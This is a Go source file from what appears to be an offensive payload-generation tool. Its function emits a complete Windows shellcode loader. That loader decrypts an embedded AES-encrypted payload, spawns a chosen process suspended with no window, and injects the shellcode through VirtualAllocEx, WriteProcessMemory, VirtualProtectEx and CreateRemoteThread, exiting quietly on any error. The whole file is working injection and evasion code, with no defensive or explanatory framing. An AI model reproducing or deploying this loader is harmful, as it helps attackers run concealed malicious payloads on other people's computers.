package loader

import (
	"fmt"
)

func LoadWindowsTemplate(s Shellcode) string {

	hexShellcode := ToString(s.Payload)
	hexKey := ToString(s.AesKey)
	hexTarget := ToString([]byte(s.Target))

	return fmt.Sprintf(`
package main

import (
        "crypto/aes"
        "os"
        "syscall"
        "unsafe"
        "strings"
        "strconv"
        "crypto/cipher"
        "errors"
)


const (
    MEM_COMMIT                = 0x1000
    MEM_RESERVE               = 0x2000
    PAGE_READWRITE            = 0x4
    PAGE_EXECUTE_READ         = 0x20
    PAGE_EXECUTE_READWRITE    = 0x40
    PROCESS_CREATE_THREAD     = 0x0002
    PROCESS_QUERY_INFORMATION = 0x0400
    PROCESS_VM_OPERATION      = 0x0008
    PROCESS_VM_WRITE          = 0x0020
    PROCESS_VM_READ           = 0x0010
    CREATE_SUSPENDED          = 0x4
    CREATE_NO_WINDOW          = 0x8000000
)

var (
    kernel32            = syscall.MustLoadDLL("kernel32.dll")
    ntdll               = syscall.MustLoadDLL("ntdll.dll")

    RtlCopyMemory       = ntdll.MustFindProc("RtlCopyMemory")

    VirtualAlloc        = kernel32.MustFindProc("VirtualAlloc")
    VirtualAllocEx      = kernel32.MustFindProc("VirtualAllocEx")
    VirtualProtectEx    = kernel32.MustFindProc("VirtualProtectEx")
    WriteProcessMemory  = kernel32.MustFindProc("WriteProcessMemory")
    OpenProcess         = kernel32.MustFindProc("OpenProcess")
    CreateRemoteThread  = kernel32.MustFindProc("CreateRemoteThread")
    closeHandle         = kernel32.MustFindProc("CloseHandle")
)


func decrypt(key []byte, ciphertext []byte) ([]byte, error) {
    c, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }

    gcm, err := cipher.NewGCM(c)
    if err != nil {
        return nil, err
    }

    nonceSize := gcm.NonceSize()
    if len(ciphertext) < nonceSize {
        return nil, errors.New("ciphertext too short")
    }

    nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
    return gcm.Open(nil, nonce, ciphertext, nil)
}


func StringBytesParseString(byteString string) (string, error) {
    byteString = strings.TrimSuffix(byteString, "]")
    byteString = strings.TrimLeft(byteString, "[")
    sByteString := strings.Split(byteString, " ")
    var res []byte
    for _, s := range sByteString {
        i, err := strconv.ParseUint(s, 10, 64)
        if err != nil {
            return "", err
        }
        res = append(res, byte(i))
    }

    return string(res), nil
}

func loadProcess(target string) *syscall.ProcessInformation {
    var si syscall.StartupInfo
	var pi syscall.ProcessInformation

	commandLine, err := syscall.UTF16PtrFromString(target)

	if err != nil {
		panic(err)
	}

    err = syscall.CreateProcess(
		nil,
		commandLine,
		nil,
		nil,
		false,
		CREATE_SUSPENDED | CREATE_NO_WINDOW,
		nil,
		nil,
		&si,
		&pi)

	if err != nil {
		panic(err)
	}

	return &pi
}

func main() {

    /* decode values from encoded bytes */
    key, err := StringBytesParseString("%s"); if err != nil {
        os.Exit(1)
    }

    bytesPayload, err := StringBytesParseString("%s"); if err != nil {
        os.Exit(1)
    }

    target, err := StringBytesParseString("%s"); if err != nil {
        os.Exit(1)
    }

    /* decrypt shellcode using AES */
    shellcode, err := decrypt([]byte(key), []byte(bytesPayload)); if err != nil {
        os.Exit(1)
    }

    /* spawn target process */
    process := loadProcess(target)
    oldProtectCfg := PAGE_READWRITE

     /* allocating the appropriate amount of memory */
    baseAddr, _, err := VirtualAllocEx.Call(
        uintptr(process.Process),
        0,
        uintptr(len(shellcode)),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    )
        if err.Error() != "The operation completed successfully." {
        os.Exit(1)
    }

    /* overwriting process memory with our shellcode */
    _, _, err = WriteProcessMemory.Call(
        uintptr(process.Process),
        baseAddr,
        uintptr(unsafe.Pointer(&shellcode[0])),
        uintptr(len(shellcode)),
        0,
    )
        if err.Error() != "The operation completed successfully." {
        os.Exit(1)
    }

    /* changing permissions for our memory segment */
    _, _, err = VirtualProtectEx.Call(
        uintptr(process.Process),
        baseAddr,
        uintptr(len(shellcode)),
        PAGE_EXECUTE_READ,
        uintptr(unsafe.Pointer(&oldProtectCfg)),
    )
        if err.Error() != "The operation completed successfully." {
        os.Exit(1)
    }

    /* load remote thread */
    _, _, err = CreateRemoteThread.Call(uintptr(process.Process), 0, 0, baseAddr, 0, 0, 0)
        if err.Error() != "The operation completed successfully." {
        os.Exit(1)
    }

    /* close process handler */
    _, _, err = closeHandle.Call(uintptr(process.Process))
    if err.Error() != "The operation completed successfully." {
        os.Exit(1)
    }
}
`, hexKey, hexShellcode, hexTarget)
}
